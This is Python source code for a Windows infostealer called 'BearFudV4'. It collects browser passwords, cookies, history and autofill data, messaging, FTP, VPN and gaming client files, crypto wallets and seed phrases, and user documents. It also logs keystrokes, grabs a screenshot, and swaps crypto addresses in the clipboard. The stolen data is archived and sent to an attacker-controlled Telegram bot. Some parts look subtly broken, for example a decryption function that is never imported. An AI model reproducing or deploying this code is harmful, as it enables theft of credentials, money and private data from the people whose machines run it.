import os
import sys
import time
import json
import base64
import subprocess
import requests
import asyncio
from pynput.keyboard import Listener
from PIL import ImageGrab
import win32clipboard
import win32con
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import zipfile
import platform
import shutil
import sqlite3
import re

class BearFudV4:
    def __init__(self):
        self.config = self.load_config()
        self.output_dir = os.path.join(os.getenv("APPDATA"), "BearFudV4")
        os.makedirs(self.output_dir, exist_ok=True)
        self.keylog = []
        self.keylog_lock = asyncio.Lock()
        self.machine_id = self.generate_machine_id()
        self.telegram_bot_token = self.config["TelegramBotToken"]
        self.telegram_chat_id = self.config["TelegramChatID"]

    def load_config(self):
        with open("config.json", "r") as f:
            return json.load(f)

    def generate_machine_id(self):
        # Generate a unique machine ID
        return subprocess.getoutput("wmic csproduct get uuid")

    def log(self, event, data):
        # Log events to a file
        with open(os.path.join(self.output_dir, "log.txt"), "a") as f:
            f.write(f"{event}: {json.dumps(data)}\n")
        self.send_log_to_telegram(event, data)

    def send_log_to_telegram(self, event, data):
        # Send log to Telegram bot
        url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
        params = {
            "chat_id": self.telegram_chat_id,
            "text": f"{event}: {json.dumps(data)}"
        }
        response = requests.post(url, params=params)
        if response.status_code!= 200:
            print(f"Error sending log to Telegram: {response.text}")

    def steal_system_info(self):
        # Steal system information
        info = {}
        info["os"] = platform.system() + " " + platform.release() + " " + platform.version()
        info["machine"] = platform.machine()
        info["hostname"] = platform.node()
        info["username"] = os.getlogin()
        info["license_key"] = subprocess.getoutput("wmic path softwarelicensingservice get OA3xOriginalProductKey")
        self.log("system_info", info)

    def steal_network_info(self):
        # Steal network information
        net_info = {}
        net_info["dns"] = subprocess.getoutput("ipconfig /displaydns")
        net_info["arp"] = subprocess.getoutput("arp -a")
        net_info["net_stats"] = subprocess.getoutput("netstat -ano")
        net_info["config"] = subprocess.getoutput("ipconfig /all")
        self.log("network_info", net_info)

    def steal_browser_data(self):
        # Steal browser data
        browser_data = {}
        browser_paths = {
            "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default"),
            "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
            "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
            "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default"),
            "Opera GX": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
            "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
            "Safari": os.path.join(os.getenv("APPDATA"), "Apple", "Safari"),
            "Internet Explorer": os.path.join(os.getenv("APPDATA"), "Microsoft", "Internet Explorer")
        }
        for browser, base_path in browser_paths.items():
            browser_data[browser] = {}
            login_db = os.path.join(base_path, "Login Data")
            cookies_db = os.path.join(base_path, "Network", "Cookies")
            history_db = os.path.join(base_path, "History")
            autofill_db = os.path.join(base_path, "Web Data")
            if os.path.isfile(login_db):
                db_copy = os.path.join(self.output_dir, f"{browser}_logins.db")
                shutil.copy2(login_db, db_copy)
                conn = sqlite3.connect(db_copy)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins") 
                logins = [] 
                for row in cursor.fetchall():
                    try:
                        password = CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8')
                        logins.append({"url": row[0], "username": row[1], "password": password})
                    except:
                        pass
                conn.close()
                browser_data[browser]["logins"] = logins
            if os.path.isfile(cookies_db):
                db_copy = os.path.join(self.output_dir, f"{browser}_cookies.db")
                shutil.copy2(cookies_db, db_copy)
                conn = sqlite3.connect(db_copy)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                cookies = []
                for row in cursor.fetchall():
                    try:
                        value = CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8')
                        cookies.append({"host": row[0], "name": row[1], "value": value})
                    except:
                        pass
                conn.close()
                browser_data[browser]["cookies"] = cookies
            if os.path.isfile(history_db):
                db_copy = os.path.join(self.output_dir, f"{browser}_history.db")
                shutil.copy2(history_db, db_copy)
                conn = sqlite3.connect(db_copy)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count FROM urls")
                history = [{"url": row[0], "title": row[1], "visits": row[2]} for row in cursor.fetchall()]
                conn.close()
                browser_data[browser]["history"] = history
            if os.path.isfile(autofill_db):
                db_copy = os.path.join(self.output_dir, f"{browser}_autofill.db")
                shutil.copy2(autofill_db, db_copy)
                conn = sqlite3.connect(db_copy)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM autofill")
                autofill = [{"name": row[0], "value": row[1]} for row in cursor.fetchall()]
                conn.close()
                browser_data[browser]["autofill"] = autofill
        self.log("browser_data", browser_data)

    def steal_ftp_clients(self):
        # Steal FTP client data
        ftp_data = {}
        ftp_paths = {
            "FileZilla": os.path.join(os.getenv("APPDATA"), "FileZilla", "recentservers.xml"),
            "WinSCP": os.path.join(os.getenv("APPDATA"), "WinSCP", "WinSCP.ini"),
            "Core FTP": os.path.join(os.getenv("APPDATA"), "Core FTP", "sites.dat"),
            "FlashFXP": os.path.join(os.getenv("APPDATA"), "FlashFXP", "sites.dat")
        }
        for client, path in ftp_paths.items():
            if os.path.isfile(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    ftp_data[client] = f.read()
        self.log("ftp_clients", ftp_data)

    def steal_im_clients(self):
        # Steal IM client data
        im_data = {}
        im_paths = {
            "Telegram": os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
            "Pidgin": os.path.join(os.getenv("APPDATA"), ".purple", "accounts.xml"),
            "Skype": os.path.join(os.getenv("APPDATA"), "Skype", "main.db"),
            "Discord": os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
        }
        for client, path in im_paths.items():
            if os.path.isdir(path):
                im_data[client] = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
            elif os.path.isfile(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    im_data[client] = f.read()
        self.log("im_clients", im_data)

    def steal_vpn_clients(self):
        # Steal VPN client data
        vpn_data = {}
        vpn_paths = {
            "NordVPN": os.path.join(os.getenv("LOCALAPPDATA"), "NordVPN"),
            "OpenVPN": os.path.join(os.getenv("APPDATA"), "OpenVPN", "config"),
            "ExpressVPN": os.path.join(os.getenv("APPDATA"), "ExpressVPN", "config"),
            "Private Internet Access": os.path.join(os.getenv("APPDATA"), "Private Internet Access", "config")
        }
        for client, path in vpn_paths.items():
            if os.path.isdir(path):
                vpn_data[client] = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
        self.log("vpn_clients", vpn_data)

    def steal_gaming_data(self):
        # Steal gaming data
        gaming_data = {}
        game_paths = {
            "Steam": os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam", "config"),
            "Discord": os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
            "Battle.net": os.path.join(os.getenv("APPDATA"), "Battle.net", "config"),
            "Origin": os.path.join(os.getenv("APPDATA"), "Origin", "config"),
            "Uplay": os.path.join(os.getenv("APPDATA"), "Uplay", "config")
        }
        for game, path in game_paths.items():
            if os.path.isdir(path):
                gaming_data[game] = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
        self.log("gaming_data", gaming_data)

    def steal_crypto_wallets(self):
        # Steal crypto wallet data
        wallet_paths = {
            "Bitcoin": os.path.join(os.getenv("APPDATA"), "Bitcoin", "wallets"),
            "Electrum": os.path.join(os.getenv("APPDATA"), "Electrum", "wallets"),
            "Exodus": os.path.join(os.getenv("APPDATA"), "Exodus"),
            "MetaMask": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
            "Atomic": os.path.join(os.getenv("APPDATA"), "atomic"),
            "Ledger Live": os.path.join(os.getenv("APPDATA"), "Ledger Live"),
            "Coinomi": os.path.join(os.getenv("APPDATA"), "Coinomi", "Coinomi", "wallets"),
            "Armory": os.path.join(os.getenv("APPDATA"), "Armory"),
            "Jaxx": os.path.join(os.getenv("APPDATA"), "Jaxx"),
            "Binance": os.path.join(os.getenv("APPDATA"), "Binance", "config"),
            "Kraken": os.path.join(os.getenv("APPDATA"), "Kraken", "config"),
            "Huobi": os.path.join(os.getenv("APPDATA"), "Huobi", "config")
        }
        wallets = {}
        for wallet, path in wallet_paths.items():
            if os.path.isdir(path):
                wallets[wallet] = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
        self.log("crypto_wallets", wallets)

    def steal_files(self):
        # Steal files
        file_data = {}
        dirs = [
            os.path.join(os.getenv("USERPROFILE"), "Desktop"),
            os.path.join(os.getenv("USERPROFILE"), "Documents"),
            os.path.join(os.getenv("USERPROFILE"), "Downloads")
        ]
        extensions = self.config["ScanFiles"]
        for dir_path in dirs:
            if os.path.isdir(dir_path):
                files = []
                for root, _, filenames in os.walk(dir_path):
                    for f in filenames:
                        file_path = os.path.join(root, f)
                        if any(f.endswith(ext) for ext in extensions) and os.path.getsize(file_path) < 20 * 1024 * 1024:
                            files.append(file_path)
                file_data[dir_path] = files
        self.log("file_enumeration", file_data)

    def steal_seed_phrases(self):
        # Steal seed phrases
        seed_phrases = {
            "Electrum": os.path.join(os.getenv("APPDATA"), "Electrum", "wallets", "seed.txt")
        }
        seed_phrase_data = {}
        for wallet, path in seed_phrases.items():
            if os.path.isfile(path):
                with open(path, "r") as file:
                    seed_phrase_data[wallet] = file.read()
        self.log("seed_phrases", seed_phrase_data)

    def steal_nft(self):
        # Steal NFT data
        nft = {
            "MetaMask": os.path.join(os.getenv("APPDATA"), "MetaMask", "Local Storage", "leveldb")
        }
        nft_data = {}
        for wallet, path in nft.items():
            if os.path.isdir(path):
                nft_data[wallet] = {}
                for root, _, files in os.walk(path):
                    for f in files:
                        file_path = os.path.join(root, f)
                        if f.endswith(".txt") or f.endswith(".json"):
                            with open(file_path, "r") as file:
                                nft_data[wallet][f] = file.read()
        self.log("nft", nft_data)

    def steal_history(self):
        # Steal history data
        history = {
            "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History"),
            "Mozilla Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles", "places.sqlite")
        }
        history_data = {}
        for browser, path in history.items():
            if os.path.isfile(path):
                with open(path, "r") as file:
                    history_data[browser] = file.read()
        self.log("history", history_data)

    def steal_auto_fills(self):
        # Steal auto-fill data
        auto_fills = {
            "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Web Data"),
            "Mozilla Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles", "formhistory.sqlite")
        }
        auto_fill_data = {}
        for browser, path in auto_fills.items():
            if os.path.isfile(path):
                with open(path, "r") as file:
                    auto_fill_data[browser] = file.read()
        self.log("auto_fills", auto_fill_data)

    def steal_cookies(self):
        # Steal cookies
        cookies = {
            "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies"),
            "Mozilla Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles", "cookies.sqlite")
        }
        cookie_data = {}
        for browser, path in cookies.items(): 
            if os.path.isfile(path):
                with open(path, "r") as file:
                    cookie_data[browser] = file.read()
        self.log("cookies", cookie_data)

    def execute_command(self, command):
        # Execute a command
        subprocess.getoutput(command)

    def start_keylogger(self):
        # Start keylogger
        def on_press(key):
            try:
                with self.keylog_lock:
                    self.keylog.append(str(key).replace("'", ""))
            except:
                pass
        from pynput.keyboard import Listener
        self.listener = Listener(on_press=on_press)
        self.listener.start()

    def stop_keylogger(self):
        # Stop keylogger
        try:
            self.listener.stop()
            with self.keylog_lock:
                self.log("keylogger", {"keys": "".join(self.keylog)})
        except Exception as e:
            self.log("keylogger_error", {"error": str(e)})

    def steal_screenshot(self):
        # Steal screenshot
        try:
            screenshot = ImageGrab.grab()
            screenshot_path = os.path.join(self.output_dir, "screenshot.png")
            screenshot.save(screenshot_path)
            self.log("screenshot", {"file": "screenshot.png", "size": os.path.getsize(screenshot_path)})
        except Exception as e:
            self.log("screenshot_error", {"error": str(e)})

    def steal_clipboard(self):
        # Steal clipboard
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            crypto_patterns = [r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", r"^0x[a-fA-F0-9]{40}$"]
            for pattern in crypto_patterns:
                if re.match(pattern, data):
                    win32clipboard.OpenClipboard()
                    win32clipboard.EmptyClipboard()
                    win32clipboard.SetClipboardText("REPLACE_WALLET_ADDRESS_HERE")
                    win32clipboard.CloseClipboard()
                    self.log("clipboard", {"data": data, "replaced": "Crypto address swapped"})
                    return
            self.log("clipboard", {"data": data})
        except Exception as e:
            self.log("clipboard_error", {"error": str(e)})

    def archive_data(self):
        # Archive data
        try:
            archive_path = os.path.join(self.output_dir, "data.zip")
            with zipfile.ZipFile(archive_path, "w") as zip_file:
                for root, _, files in os.walk(self.output_dir):
                    for f in files:
                        file_path = os.path.join(root, f)
                        zip_file.write(file_path, os.path.relpath(file_path, self.output_dir))
            return archive_path
        except Exception as e:
            self.log("archive_error", {"error": str(e)})

    async def send_to_telegram(self, archive_path):
        # Send data to Telegram
        try:
            bot_token = self.telegram_bot_token
            chat_id = self.telegram_chat_id
            with open(archive_path, "rb") as f:
                files = {"document": f}
                response = requests.post(f"https://api.telegram.org/bot{bot_token}/sendDocument", params={"chat_id": chat_id}, files=files)
                if response.status_code == 200:
                    self.log("telegram", {"status": "success"})
                else:
                    self.log("telegram_error", {"error": response.text})
        except Exception as e:
            self.log("telegram_error", {"error": str(e)})

    async def run(self):
        self.start_keylogger()
        self.steal_system_info()
        self.steal_network_info()
        self.steal_browser_data()
        self.steal_ftp_clients()
        self.steal_im_clients()
        self.steal_vpn_clients()
        self.steal_gaming_data()
        self.steal_crypto_wallets()
        self.steal_files()
        self.steal_seed_phrases()
        self.steal_nft()
        self.steal_history()
        self.steal_auto_fills()
        self.steal_cookies()
        self.execute_command("Cmd: dir")
        time.sleep(65)  # Wait for keylogger
        self.stop_keylogger()
        self.steal_screenshot()
        self.steal_clipboard()
        archive = self.archive_data()
        if archive:
            await self.send_to_telegram(archive)

if __name__ == "__main__":
    bear_fud = BearFudV4()
    asyncio.run(bear_fud.run())